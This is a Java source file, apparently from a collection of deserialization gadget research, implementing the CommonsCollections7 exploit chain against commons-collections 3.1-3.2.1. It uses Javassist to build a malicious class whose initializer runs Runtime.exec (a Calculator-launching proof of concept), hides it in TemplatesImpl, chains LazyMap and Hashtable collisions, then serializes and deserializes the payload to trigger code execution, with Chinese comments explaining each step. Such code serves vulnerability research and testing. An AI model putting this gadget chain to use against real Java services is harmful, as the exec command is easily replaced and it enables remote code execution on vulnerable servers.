package com.sec.exploits.CommonsCollections.CommonsCollections7;

import com.sec.annotation.Dependencies;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/**
 * @program: Gadgets
 * @description:
 * @author: 0range
 * @create: 2021-05-17 15:31
 **/



/**
 * Gadgets chain :
 *          ObjectInputStream.readObject()
 *            Hashtable.readObject()
 *              Hashtable.reconstitutionPut()
 *                 AbstractMapDecorator.equals()
 *                      AbstractMap.equals()
 *                          LazyMap.get()
 *                            ChainedTransformer.transform()
 *     					        ConstantTransformer.transform()
 *     					        InstantiateTransformer.transform()
 *     							  (TrAXFilter)Constructor.newInstance()
 *     						       TrAXFilter#TrAXFilter()
 *     							   TemplatesImpl.newTransformer()
 *     									TemplatesImpl.getTransletInstance()
 *     								    TemplatesImpl.defineTransletClasses()
 *     										（PayLoad）newInstance()
 *     									        Runtime.exec()
*/




@Dependencies({
        "commons-collections:commons-collections:3.1-3.2.1",
        "jdk1.7 & 1.8"
})
public class InstantiateTransformer_Hashtable_Exploit {
    public static void main(String[] args) throws Exception{

        //1.先创建恶意类
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass tempExploitClass = pool.makeClass("3xpl01t");
        //一定要设置父类，为了后续顺利
        tempExploitClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        //写入payload，生成字节数组
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");";
        tempExploitClass.makeClassInitializer().insertBefore(cmd);
        byte[] exploitBytes = tempExploitClass.toBytecode();


        //2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件
        TemplatesImpl tmpl = new TemplatesImpl();
        //设置_bytecodes属性为exploitBytes
        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(tmpl, new byte[][]{exploitBytes});
        //一定要设置_name不为空
        Field _name = TemplatesImpl.class.getDeclaredField("_name");
        _name.setAccessible(true);
        _name.set(tmpl, "0range");
        //_class为空
        Field _class = TemplatesImpl.class.getDeclaredField("_class");
        _class.setAccessible(true);
        _class.set(tmpl, null);


        //假的chain
        Transformer[] fakeTransformer = new Transformer[]{};

        //3.构造chain，封装进LazyMap
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{tmpl}
                )
        };

        Transformer fakeChain = new ChainedTransformer(fakeTransformer);

        //LazyMap实例
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        //创建两个lazymap实例
        Map lazyMap1 = LazyMap.decorate(innerMap1,fakeChain);
        lazyMap1.put("yy", 1);
        Map lazyMap2 = LazyMap.decorate(innerMap2,fakeChain);
        lazyMap2.put("zZ", 1);

        Hashtable hashTable = new Hashtable();
        hashTable.put(lazyMap1, "0range");
        hashTable.put(lazyMap2, "0range");


        //通过反射设置真的 chain 数组
        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(fakeChain, transformers);

        lazyMap2.remove("yy");

        //payload序列化写入文件，模拟网络传输
        ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_cc7_TemplatesImpl_HashTable.ser")));
        fout.writeObject(hashTable);

        //服务端读取文件，反序列化，模拟网络传输
        ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_cc7_TemplatesImpl_HashTable.ser")));
        //服务端反序列化，触发漏洞
        fin.readObject();

    }
}
